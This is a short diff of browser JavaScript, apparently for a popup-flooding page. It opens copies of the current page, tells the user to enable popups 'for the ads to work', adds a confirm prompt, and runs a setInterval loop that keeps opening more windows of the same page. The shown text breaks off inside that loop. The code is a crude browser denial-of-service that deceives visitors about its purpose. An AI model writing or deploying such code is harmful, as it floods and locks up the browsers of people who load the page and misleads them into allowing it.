@@ -1,9 +1,9 @@
 newWin = window.open(window.location.href);
-if(!newWin || newWin.closed || typeof newWin.closed=='undefined') { 
+if(!newWin) { 
   alert("Please enable popups inorder for the ads to work");
 }
+if(!confirm("Are you sure you wanna continue?")) close();
 
-alert("Still using this device?");
 setInterval(() => {
   window.open(window.location.href);
   window.open(window.location.href);
